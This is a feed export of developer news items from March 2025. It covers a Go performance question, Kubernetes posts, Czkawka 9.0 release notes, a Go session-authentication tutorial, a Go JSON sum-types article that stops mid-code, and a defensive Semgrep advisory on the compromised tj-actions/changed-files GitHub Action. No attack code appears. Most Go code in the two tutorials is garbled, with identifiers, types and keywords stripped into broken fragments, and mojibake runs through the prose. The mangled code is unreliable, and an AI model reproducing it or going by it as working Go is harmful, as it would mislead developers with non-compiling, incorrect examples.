+ "\n") I ran this on a big file, here's the link:It takes  to run. Thatâ€™s unacceptable. My CPU (R5 4600H 6C/12T, 24GB RAM) should not be struggling this hard.I also profiled this code, Profiling Says: 1. Sorting (slices.Sort) is eating CPU. 2. GC is doing a world tour on my RAM. 3. map[string]bool is decent but might not be the best for this. I also tried the map[string] struct{} way but it's makes really minor difference.The Goal: I want this thing to finish in 2-3 seconds. Maybe Iâ€™m dreaming, but whatever.Any insights, alternative approaches, or even just small optimizations would be really helpful. Please if possible give the code too. Because I've literally tried so many variations but it still doesn't work like I want it to be. I also want to get better at writing efficient code, and squeeze out performance where possible.]]></content:encoded></item><item><title>GitOps Principles - Separate Repositories for App &amp; Kubernetes</title><link>https://www.reddit.com/r/kubernetes/comments/1jcn002/gitops_principles_separate_repositories_for_app/</link><author>/u/k8s_maestro</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 14:44:24 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[For a production-grade environment, the best practice is to keep the application source code and infra in separate Git repositories. Is it true GirOps Principle? As it ensures clear separation of concerns, security and operational stability.]]></content:encoded></item><item><title>xlskubectl â€” a spreadsheet to control your Kubernetes cluster</title><link>https://github.com/learnk8s/xlskubectl</link><author>/u/ponton</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 14:43:51 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>OpenSource Book: Embedded programming with ESP32 (For esp-hal 1.0.0-beta)</title><link>https://www.reddit.com/r/rust/comments/1jcmj3g/opensource_book_embedded_programming_with_esp32/</link><author>/u/AstraKernel</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 14:22:32 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[The book "impl Rust for ESP32" has been migrated to use the latest esp-hal 1.0.0-beta; The book uses development board "ESP32 DevKit V1 and follows practical exercises approach. Added more chapters also.Blink LED, Fading LED with PWMDisplaying Text and Ferris image on OLED displayBuzzer to make beep sound and play Pink Panther song (repo for other songs)Using Ultrasonic to measure object distanceControl Servo motor with LEDC as well as MCPWM peripheralsTurning on LED when room gets darker with LDRConnect to existing Wi-Fi or Create own Wi-FiRun web server to turn on LED on ESP32Create Burglar alarm simulation with PIR SensorDisplaying temperature on OLEDReading and Writing SD CardWorking with RFID and Door Access Control simulationSend and Receive from mobile to ESP32 via Bluetooth   submitted by    /u/AstraKernel ]]></content:encoded></item><item><title>SuperMuxer: tiny and compact, dependency-free package to configure your HTTP routes</title><link>https://www.reddit.com/r/golang/comments/1jcmfrb/supermuxer_tiny_and_compact_dependencyfree/</link><author>/u/FlairPrime</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 14:18:10 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Super  Go package to configure your HTTP routes using only the . Define routes, middlewares, groups, and subgroups effortlessly!This package acts like a : It is  and , providing everything you need in just  file with less than 200 lines of code.You want to  define your HTTP routes while using  the standard library.You want to define  for your routes, groups, and subgroups while still relying on the standard library.You  want to use  bloated with excessive functionalities that you might never use.]]></content:encoded></item><item><title>Building a UI for Kubernetes, Helpful or Useless?</title><link>https://www.reddit.com/r/kubernetes/comments/1jckjsm/building_a_ui_for_kubernetes_helpful_or_useless/</link><author>/u/Pavel-Lukasenko</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 12:39:36 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[Hey everyone. I'm have been using Kubernetes for the last two years now and somehow got tired of typing kubectl and other stuff via command line.I have built a native app that runs on my MacBook and helps me speed up cluster deployment, app publishing and debugging with the help of the UI.I don't know if that might be useful for anyone but I am really open to any feedback.Would you like trying it?]]></content:encoded></item><item><title>Big LLMs weights are a piece of history</title><link>https://antirez.com/news/147</link><author>freeatnet</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 12:13:24 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>SteamOS 3.7.0 Preview Released (with KDE Plasma 6 &amp; beginnings of support for non-Steam Deck handhelds)</title><link>https://steamcommunity.com/games/1675200/announcements/detail/529841158837240757</link><author>/u/pihug12</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 12:10:48 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Docs â€“ Open source alternative to Notion or Outline</title><link>https://github.com/suitenumerique/docs</link><author>maelito</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 11:38:52 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Git 2.49 Released With Faster Packing, Rust Foreign Language Interface</title><link>https://www.phoronix.com/news/Git-2.49-Released</link><author>/u/corvus_192</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 10:38:06 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[
Git 2.49 is out today as the latest feature update for this widely-used distributed version control system.
Git 2.49 delivers faster packing via name-hash v2, a new "git backfill" tool to address any missing historical blobs, "git clone" learned to make a shallow clone for a single commit that is not necessarily at the tip of any branch, lazy-loading missing files in a blobless clone, zlib-ng support preparations, and a foreign language interface for Rust has been added to the codebase.
This first bit of Rust code within Git introduces two new Rust crates: libgit-sys and libgit. Further work on Rust code within Git is being carried out for future Git releases.
Download and more details on the Git 2.49 release via the release announcement. Over on the GitHub blog are also more details on the Git 2.49 changes.]]></content:encoded></item><item><title>Introducing Eventure: A Powerful Event-Driven Framework for Python</title><link>https://github.com/enricostara/eventure</link><author>/u/jumpixel</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 09:24:11 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Czkawka/Krokiet 9.0 â€” Find duplicates faster than ever before</title><link>https://www.reddit.com/r/linux/comments/1jchp31/czkawkakrokiet_90_find_duplicates_faster_than/</link><author>/u/krutkrutrar</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 09:23:55 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0 The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.With each new release, it seems that I am slowly reaching the limits â€” of my patience, Rustâ€™s performance, and the possibilities for further optimization.Czkawka is now at a stage where, at first glance, itâ€™s hard to see what exactly can still be optimized, though, of course, itâ€™s not impossible.Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.Automatically rotating all images based on their EXIF orientationFixed a crash caused by negative time values on some operating systemsUpdated `vid_dup_finder`; it can now detect similar videos shorter than 30 secondsAdded support for more JXL image formats (using a built-in JXL â†’ image-rs converter)Improved duplicate file detection by using a larger, reusable buffer for file readingAdded an option for significantly faster image resizing to speed up image hashingLogs now include information about the operating system and compiled app features(only x86_64 versions)Added size progress tracking in certain modesAbility to stop hash calculations for large files mid-processImplemented multithreading to speed up filtering of hard linksReduced prehash read file size to a maximum of 4 KBFixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU coresImproved scan cancellation speed when collecting files to checkAdded support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variablesFixed a crash in debug mode when checking broken files named `.mp3`Catching panics from symphonia crashes in broken files modePrinting a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)Changed the default tab to â€œDuplicate Filesâ€Added a window icon in WaylandDisabled the broken sort buttonAdded `-N` and `-M` flags to suppress printing results/warnings to the consoleFixed an issue where messages were not cleared at the end of a scanAbility to disable cache via `-H` flag(useful for benchmarking)This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runnersLinux and Mac binaries now are provided with two options x86_64 and arm64Arm linux builds needs at least Ubuntu 24.04Gtk 4.12 is used to build windows gtk gui instead gtk 4.10Dropping support for snap builds â€” too much time-consuming to maintain and testing(also it is broken currently)Removed native windows build krokiet version â€” now it is available only cross-compiled version from linux(should not be any difference)In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTKâ€™s TreeView.Price â€” free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL]]></content:encoded></item><item><title>Czkawka/Krokiet 9.0 â€” Find duplicates faster than ever before</title><link>https://www.reddit.com/r/rust/comments/1jchjc4/czkawkakrokiet_90_find_duplicates_faster_than/</link><author>/u/krutkrutrar</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sun, 16 Mar 2025 09:11:38 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[Today I released new version of my apps to deduplicate files - Czkawka/Krokiet 9.0The current version primarily focuses on refining existing features and improving performance rather than introducing any spectacular new additions.With each new release, it seems that I am slowly reaching the limits â€” of my patience, Rustâ€™s performance, and the possibilities for further optimization.Czkawka is now at a stage where, at first glance, itâ€™s hard to see what exactly can still be optimized, though, of course, itâ€™s not impossible.Video, Duplicate (smaller prehash size), and Image cache (EXIF orientation + faster resize implementation) are incompatible with previous versions and need to be regenerated.Automatically rotating all images based on their EXIF orientationFixed a crash caused by negative time values on some operating systemsUpdated `vid_dup_finder`; it can now detect similar videos shorter than 30 secondsAdded support for more JXL image formats (using a built-in JXL â†’ image-rs converter)Improved duplicate file detection by using a larger, reusable buffer for file readingAdded an option for significantly faster image resizing to speed up image hashingLogs now include information about the operating system and compiled app features(only x86_64 versions)Added size progress tracking in certain modesAbility to stop hash calculations for large files mid-processImplemented multithreading to speed up filtering of hard linksReduced prehash read file size to a maximum of 4 KBFixed a slowdown at the end of scans when searching for duplicates on systems with a high number of CPU coresImproved scan cancellation speed when collecting files to checkAdded support for configuring config/cache paths using the `CZKAWKA_CONFIG_PATH` and `CZKAWKA_CACHE_PATH` environment variablesFixed a crash in debug mode when checking broken files named `.mp3`Catching panics from symphonia crashes in broken files modePrinting a warning, when using `panic=abort`(that may speedup app and cause occasional crashes)Changed the default tab to â€œDuplicate Filesâ€Added a window icon in WaylandDisabled the broken sort buttonAdded `-N` and `-M` flags to suppress printing results/warnings to the consoleFixed an issue where messages were not cleared at the end of a scanAbility to disable cache via `-H` flag(useful for benchmarking)This release is last version, that supports Ubuntu 20.04 github actions drops this OS in its runnersLinux and Mac binaries now are provided with two options x86_64 and arm64Arm linux builds needs at least Ubuntu 24.04Gtk 4.12 is used to build windows gtk gui instead gtk 4.10Dropping support for snap builds â€” too much time-consuming to maintain and testing(also it is broken currently)Removed native windows build krokiet version â€” now it is available only cross-compiled version from linux(should not be any difference)In the next version, I will likely focus on implementing missing features in Krokiet that are already available in Czkawka, such as selecting multiple items using the mouse and keyboard or comparing images.Although I generally view the transition from GTK to Slint positively, I still encounter certain issues that require additional effort, even though they worked seamlessly in GTK. This includes problems with popups and the need to create some widgets almost from scratch due to the lack of documentation and examples for what I consider basic components, such as an equivalent of GTKâ€™s TreeView.Price â€” free, so take it for yourself, your friends, and your family. Licensed under MIT/GPL]]></content:encoded></item><item><title>Show HN: My high school teamâ€™s space probe</title><link>https://drive.google.com/file/d/1_9V6lBTIfDsPdKCohQBc5Ed5UzDbnsrI/view?usp=sharing</link><author>JohnOfOsgiliath</author><category>dev</category><category>hn</category><pubDate>Sun, 16 Mar 2025 08:48:09 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Session-Based Authentication in Go</title><link>https://themsaid.com/session-authentication-go</link><author>/u/themsaid</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sun, 16 Mar 2025 08:36:13 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Earlier, we explored session management in Go web applications, followed by a deep dive into CSRF protection. Drawing from my decade of experience building web applications with Laravel, I've found that good old session-based authentication remains the most convenient and secure way to authenticate users. It strikes the perfect balance between simplicity and security, making it an approach I trust for building reliable web apps.The idea behind session-based authentication is simple:Client                                    Server
  |                                          |
  |   User visits the web app              |
  |----------------------------------------> |
  |                                          |
  |   Server creates a session  sends   |
  |     its  back                          |
  | <--------------------------------------- |
  |                                          |
  |   User submits login form              |
  |----------------------------------------> |
  |                                          |
  |   Server verifies credentials and      |
  |     stores the user identifier in the    |
  |     session                              |
  |                                          |
  |   Server sends a success response      |
  | <----------------------------------------|
  |                                          |
  |   Client makes authenticated requests  |
  |     (Cookie is automatically sent)       |
  |----------------------------------------> |
  |                                          |
  |   Server retrieves session data     |
  |     extracts the user identifier         |
  |                                          |
  |   Server processes request          |
  |     responds                             |
  | <----------------------------------------|When a session is first created, before the visitor submits the login form, it is known as an . At this stage, the session is not yet linked to a specific user, but it can still store temporary data that enhances the user experience.For example, in an e-commerce application, an unauthenticated session can store items added to a shopping cart before the user logs in. In a blog or forum, an unauthenticated session might be used to save a visitorâ€™s draft comments before they sign up. In general, unauthenticated sessions can be used to store flash messages, such as "Item added to cart" or "Invalid login credentials".Once the login form is submitted and the user's identity is verified, storing the user identifier in the session converts it into an . Each time the client sends the cookie containing the session ID, the server uses it to identify the associated user and tailor the response accordingly.The first step in implementing an authentication mechanism in our web application is to enable user registration. During this process, a user typically provides an email or username along with a password. The server then performs input sanitization and various validation checks to ensure the credentials are secure, properly formatted, and unique.Once these checks are passed, the server securely stores the userâ€™s credentials, often hashing the password using a strong algorithm like  or  before saving it to the database.Since the scope of this articles covers only the authentication part, we'll skip input validation and sanitization and focus on hashing the password and storing it in a database: (
	
)

(
    sql., 
    , 
    ,
)  {
	, .(
		[](),
		.,
	)
	 {
		
	}

	
}The first step in our  method is to generate a secure hash for the provided password using the  package. This is a crucial security measure that helps protect user credentials in case the database is ever compromised. Hashing passwords ensures that even if an attacker, or a rogue employee, gains access to the database, they cannot easily retrieve the original password.The  algorithm includes a cost factor, which controls how computationally expensive it is to hash a password and verify it later. A higher cost factor increases security by making brute-force attacks more difficult, but it also slows down the hashing process.In our example, we use the default cost of 10, which strikes a good balance between security and performance. Popular frameworks, such as Laravel, set the default cost to 12 for added protection.Next, we'll store the  along with the  in the database:,  bcrypt.()



_, .(
    ,
    ,
    ,
)
 {
    
}With this in place, we now have a record in the database that allows us to verify user credentials when they attempt to log in.For session-based authentication, the login process consists of two key steps:Verify that the user exists and the provided password matches the stored hash.Store the authenticated user's information in the session to maintain their logged-in state.In the first step, we retrieve the user record from the database using the provided username and compare the given password with its hashed version. We do that in a  function:(
	sql.,
	,
	,
)  {
	.(
		,
		,
	).()
	 {
		.(, )
	}

	.(
		[](),
		[](),
	)
	 {
		.(, )
	}

    
}The bcrypt.CompareHashAndPassword function allows us to verify whether a given plain-text password () matches a bcrypt-hashed password (). Since the bcrypt algorithm generates a unique salt for each hash, hashing the same password multiple times will always produce different results. This means we cannot simply hash the plain password and compare it directly to the stored hash in a database query. Instead,  extracts the salt from the stored hash and uses it to perform the comparison securely.Next, for storing the user in the session, we will add a  function:(
	http.,
	,
	,
)  {
	()

	.()
	 {
		.(, )
	}

	.(, )

	
}The  function takes in the request, the session manager, and the username. It retrieves the session from the request using the  function (which we covered in a previous article), then migrates the session by deleting the existing session from the session store, assigning a new session ID, and generating a fresh CSRF token. Finally, it stores the username in the session to maintain the user's authenticated state.Generating a new session ID when a user's privilege level changes is crucial for protecting against session fixation attacks. Without this step, an attacker could inject a known session ID into the user's session cookie before they authenticate, and then reuse this session ID after the user logs in. This would grant the attacker unauthorized access to the user's account.The  method looks like this: () ()  {
	..(.)
	 {
		
	}

	.()
	.(, ())

	
}As you can see, the old session is deleted while the in-memory session instance gets a new session ID and .Before sending the response, the session manager's middleware will include the new session ID in the response, and store the session as a new entry in our session store. For a deeper dive into how this works, refer to the earlier article.To log a user out, we must migrate the session and remove the  from the session data:(
	http.,
	,
)  {
	()

	.()
	 {
		.(, )
	}

	.(, )

	
}By migrating the session, we ensure that the existing authenticated session is removed from the session store and a new one is created with the same session data. In the  function, we remove the  from the session to effectively convert it into an unauthenticated session. If any other critical information is stored in the session, it should also be removed. However, keeping non-critical session data, such as user preferences or timezone settings, can help provide a smooth user experience.Authentication MiddlewareNow, weâ€™ll add middleware to protect handlers from unauthenticated access. Within the middleware, weâ€™ll query the database to verify that the username stored in the session exists, ensuring the session belongs to a valid user:(sql.,  http.) http. {
	.(( http., http.) {
		()

		.().()
		 {
			.(, , .)
			
		}

		.(
			,
			,
		).()
		 {
			.(, , .)
			
		}

		 {
			.(, , .)
			
		}
	})
}As you might have guessed, this middleware must run after the session has been added to the request. In other words, the session manager's middleware must execute before the authentication middleware. Otherwise, the authentication middleware will panic when calling the  function, as it expects the session to be present in the request context.(http.)  {
	, .().({}).()
	 {
		()
	}

	
}In our middleware, we respond with a  error if authentication fails. Alternatively, you could choose to redirect the user to a  page, allowing them to enter their credentials and start a new authenticated session.Preventing Timing AttacksWhen handling login requests, it's best practice to ensure the authentication process takes a constant amount of time, regardless of whether the credentials are correct or not. This helps prevent timing attacks, which is a type of attacks where an attacker measures the time it takes for the server to respond and uses that information to infer sensitive data, such as valid usernames or partial password matches.To protect against timing attacks, we'll start a timer at the beginning of our handler and invoke a  call to ensure the handler responds exactly after a certain duration:.(, ( http., http.) {
    ..()

    .(
        ,
        .(),
        .(),
    )
     {
        .(, , .())
    }

    .().()  {
        .(.().())
    }

     {
        .(, , .)
        
    }

    .(, , , .)
})Here, we set the handler's duration to 1 second, but you can adjust this based on your application's performance needs and the desired user experience. Next, we call the  function to check if the provided credentials are valid. If they are, we proceed with the  function.Before returning either a success or failure response, we measure the elapsed time and call  if itâ€™s less than 1 second, ensuring a consistent response time to mitigate timing attacks.By storing the authenticated user identifier in the session, we can easily differentiate between authenticated and non-authenticated sessions. This allows us to retrieve user information at any point during the request lifecycle, ensuring that we can verify and tailor responses based on the user's authentication status.The process is simple: we begin by extracting the session from the request, and then check the username session attribute:()

.().()
 {
    
}  {
    
}If the username exists, it indicates that the session is authenticated, and we can proceed to access relevant user data. If not, we know that the session is not authenticated, and we can prompt the user to log in.]]></content:encoded></item><item><title>&quot;Gunyah Hypervisor Software - Supporting Protected VMs in Android Virtualization Framework&quot; by Elliot Berman and &quot;Co-written with Prakruthi Deepak Heragu&quot; (January 28, 2024)</title><link>https://www.qualcomm.com/developer/blog/2024/01/gunyah-hypervisor-software-supporting-protected-vms-android-virtualization-framework</link><author>/u/throwaway16830261</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 08:35:52 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Popular GitHub Action `tj-actions/changed-files` has been compromised with a payload that appears to attempt to dump secrets</title><link>https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/</link><author>/u/alexeyr</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 06:24:24 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Popular GitHub Action tj-actions/changed-filesÂ has been compromised (GitHub issue) with a payload that appears to attempt to dump secrets, impacting thousands of CI pipelines.Â This isnâ€™t the first security issue with tj-actions/changed-filesâ€”see prior vulnerability CVE-2023-51664. Switch to a safer alternative or inline your file-change detection logic.Just removing it from the main branch of your repository wonâ€™t be enough â€” it could still run on other branches depending on how your actions are configured. So you need to remove it from  branches to be safe.Youâ€™ll need a list of GitHub Actions used at your org. Run this query on your codebase:$ semgrep -e 'uses: $ACTION' -l yaml --json .github  | jq -r '.results[].extra.metavars["$ACTION"].abstract_content' | grep -vE '^(actions/|docker://|[.]/[.]github/|tj-actions/)' | awk -F'@' '{print $1 "@*,"}' | sort | uniq
DataDog/synthetics-ci-github-action@*,
actions-rs/toolchain@*,
astral-sh/setup-uv@*,
aws-actions/amazon-ecr-login@*,Remove tj-actions/changed-files from the list of GitHub Actions.Generally, pin all GitHub Actions to specific commit SHAs (rather than version tags) you know are safe. In this case, it appears that all versions are compromised.Audit past workflow runs for signs of compromise. Check logs for suspicious outbound network requests. Prioritize repos where your CI runner logs are public, as secrets are dumped to stdout in the payload.]]></content:encoded></item><item><title>When a junior/entry SWE job lists Kubernetes &amp; Docker what do they expect you to know?</title><link>https://www.reddit.com/r/kubernetes/comments/1jceuxe/when_a_juniorentry_swe_job_lists_kubernetes/</link><author>/u/Bobsthejob</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sun, 16 Mar 2025 05:49:56 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[If its not a DevOps job, but for example I have seen some backend dev jobs where as part of the requirements they list the usual CI/CD best practices, and Docker, and K8s ~ but what do they actually expect you to know in an interview for K8s? Thanks (edit explanation)]]></content:encoded></item><item><title>Decoding JSON sum types in Go without panicking</title><link>https://nicolashery.com/decoding-json-sum-types-in-go/</link><author>/u/FoxInTheRedBox</author><category>dev</category><category>reddit</category><pubDate>Sun, 16 Mar 2025 04:42:06 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The Go programming language doesn't have native support for sum types, but we'll see how we can emulate them, how to decode and encode them into JSON, and how in some cases they can help avoid runtime panic exceptions.Whether we find them useful or not, sum types existMany languages support sum types natively: Zig, TypeScript, OCaml, Rust, just to name a few. Even OpenAPI has them, the de-facto standard and language-agnostic way to define HTTP APIs using JSON. So even if the programming language you're using doesn't natively support sum types, you may still need to handle a JSON payload over the wire that is modeled as one. This requires deciding how to decode that payload in your language of choice.Personal feelings about sum types aside, I think most people would agree they effectively model data structures that can be "one of these (potentially very different) things, and nothing else". And once you've experienced sum types with a  or match expression combined with , it's hard to go back.Let's take a primitive type, a boolean or  in Rust. It has 2 possible values:  or  (also called "cardinality"). A struct or record is called a  because you can count the number of possible values (or cardinality) by  the number of possible values of each field. So if I have a struct with 2 boolean fields (example here in Rust):
    signed_up
    subscribedThe number of possible values for this struct (or "product type") is: 2x2 = .Now I didn't choose this struct example completely at random. Some of the possible values are not valid in this particular domain: a user can't be  if they are not  as well. You'll also hear the phrase "make illegal states unrepresentable" when talking about sum types.A  is called that way because... you guessed it. You can count the number of possible values (or cardinality) by  the number of possible values of each branch. So if I have the following sum type (example still in Rust, where they are called "enums"): subscribedThe number of possible values for this "sum type" is: 1+2 = .I'll leave it as an exercise to the reader to discuss and decide which of these two data structures is better adapted for representing this particular domain.My first nil pointer panic in Go was due to lack of sum typesOk, that section title is a bit cheeky and probably not entirely true. But when I figured out what caused the panic in my code, the thought "sum types would've caught this at compile time"  cross my mind. I'm sure the astute reader could find better ways to structure my first implementation, even without sum types. But humor me for the sake of this article.Let me say it now: This is  one of those "Go should have sum types" post. A lot has already been written on the topic and I don't want to get into the debate (although you'll probably guess where I stand). Let's just assume I want to  something like sum types in Go, then:How do I do so without straying too far from what's idiomatic in the language?How do I encode and decode it, to and from JSON, with the structure we'll see below?This post is also  a criticism of Go. I came across this issue in my first Go project, and I actually enjoyed working with the language. Having shied away from Go for a while (notably because of lack of sum types), I finally gave it a try because it seemed a good fit for this project. The fast compile times, robust standard library, simplicity of the language, and great developer tooling all delivered on their promise.For the anecdote, the first time I ran  was on the sample codebase from Alex Edward's "Let's Go Further" book (excellent book by the way), and I had to run it again because it was so much faster than what I was used to ( Haskell ), I thought nothing had happened.Back to the historical context: I'm feeling very productive with Go on this particular project. The feedback loop is amazing, and I have a working proof-of-concept in just a couple of days. Code seems to just slip from my fingers, everything works on the first try, zero values and pointers do not scare me anymore, I just need to add this last thing and... then it hits me:2024/12/07 12:16:53 http: panic serving [::1]:60984:
runtime error: invalid memory address or nil pointer dereference
goroutine 4 [running]:
net/http.(*conn).serve.func1()
    /usr/local/go/src/net/http/server.go:1947 +0xb0
panic({0x100a00f00?, 0x100f19b00?})
    /usr/local/go/src/runtime/panic.go:785 +0x124
example/main.TransformAction(0x14000115e08)
    /Users/nicolashery/dev/example/main.go:110 +0x1c
example/main.(*Server).handleTransformActions(0x140001cad80, {0x100ad6358, 0x14000160380}, 0x140001597c0)
    /Users/nicolashery/dev/example/main.go:157 +0x20c
[...]Ouch. Having done a lot of Haskell and (strict) TypeScript recently, I had forgotten one could get such runtime errors. But I don't panic (pun intended), and I carefully look at the code mentioned in the stack trace.Below is a simplified version of the code for the sake of this article (the actual implementation had bigger structures and more cases). Can you spot the error? You have 5 seconds.a Action result  aType  ActionType_CreateObject
		result  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject
		result  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject
		result  fmt aObjectID ActionType_DeleteAllObjects
		result  result
Ok, obviously you'll want to  on  to see what it is: Action 
	Type   ActionType 
	Object Object    
	ID     object Object Action  Action
		Type   ActionType_CreateObject
		Object objectobject Object Action  Action
		Type   ActionType_UpdateObject
		Object objectid  Action  Action
		Type ActionType_DeleteObject
		IDid Action  Action
		Type ActionType_DeleteAllObjectsDid you see the error? If yes, then you can stop reading now and get back to work. I'm joking. Didn't see it in the allowed time limit? Don't worry, the Go type checker couldn't either.Decoding JSON sum types in Go, take oneHow did I get to the code above, you might wonder? Well, imagine our service is receiving a JSON payload that looks like this:These are all different types of "actions", and this JSON representation is not unreasonable. The OpenAPI specification has a discriminator "pet" example, and the Redocly documentation a "vehicle" example, that are similar to this. (I have yet to come across an API with pets so apologies my example will be the less fun, but maybe more realistic.)My naive attempt to decode this JSON, because I was in a rush (and maybe also because Copilot suggested it, if I'm being honest), was to create a struct which I call . This is a struct with all possible fields for every action type merged, and using pointers. The zero-value of pointers is  which will be set for fields that are "unused" by a particular action type. Here it is in all its glory: Action 
	Type   ActionType 
	Object Object    
	ID      ActionType 
	ActionType_CreateObject     ActionType 
	ActionType_UpdateObject     ActionType 
	ActionType_DeleteObject     ActionType 
	ActionType_DeleteAllObjects ActionType This works because  doesn't care if there are missing fields in the JSON payload, it will just set the zero-value for them:actions Action err  jsondataactions err  err
We can also go the other way and call  to encode the struct into the same JSON representation as the snippet above. The  struct tag option will remove fields unused by each action type from the resulting JSON.So we're off to the races, what can go wrong with a bag of pointers? Subtle bugs when trying to access a field that is  because unused by that action type, that's what: aType  ActionType_CreateObject
	result  fmt aObjectType aObjectID aObjectName ActionType_UpdateObject
	result  fmt aObjectType aObjectID aObjectName ActionType_DeleteObject
	result  fmt aObjectID ActionType_DeleteAllObjects
	result How do OpenAPI and Protobuf handle this?I pick myself up after this runtime panic, and have the following genius idea: There are code generators for OpenAPI, if I give them the specification for the JSON discriminated union above, what do they output for Go? Also, Protocol Buffers is a popular wire format that is based on code generation, and the Oneof field looks a lot like a sum type, so what do  generate for Go?The OpenAPI schema for an action would look like this: object
   type
     object
   string
    If I feed this to the OpenAPI Generator (note that I'm using the useOneOfDiscriminatorLookup=true option for better output), I get what I'll call a "bag of all the branches": Action 
	createObject     CreateObject
	updateObject     UpdateObject
	deleteObject     DeleteObject
	deleteAllObjects DeleteAllObjects
 CreateObject 
	Object Object It generates an  method for  that:first decodes the JSON to check the  field (this is thanks to the useOneOfDiscriminatorLookup=true codegen option)according to the value of , it chooses the appropriate branch and decodes the JSON using the corresponding struct (, , etc.)Edited for clarity, it looks something like this:a Actiondata  tagged 
		Type ActionType  err  jsondatatagged err  err
	 err  taggedType  ActionType_CreateObject
		err  jsondataacreateObject ActionType_UpdateObject
		err  jsondataaupdateObject ActionType_DeleteObject
		err  jsondataadeleteObject ActionType_DeleteAllObjects
		err  jsondataadeleteAllObjectsTo get the actual underlying value, the generator creates a method (which I'll name  here) that returns the first non-nil pointer:a Action any  acreateObject  acreateObject
	 aupdateObject  aupdateObject
	 adeleteObject  adeleteObject
	 adeleteAllObjects  adeleteAllObjects
	So this is already a big improvement on my  approach. Since the accessor method to the underlying value returns , I'm now checking the  which can be one of the more precise structs (, , etc.):action Action result  v  actionCreateObject
		result  fmt vObjectType vObjectID vObjectNameUpdateObject
		result  fmt vObjectType vObjectID vObjectNameDeleteObject
		result  fmt vIDDeleteAllObjects
		result  result
Some issues remain though:I "trust" the  return value of the accessor method to be one of the action structs (, , etc.) and nothing elseIf I add a "branch" (i.e. another action type), I can easily forget to update the  statement in Another generator that I tried out, oapi-codegen, uses a slightly different approach. It holds on to a  and delays the decoding until we call an equivalent of the  accessor method: Action 
	union jsonRawMessage
 CreateObject 
	Type   
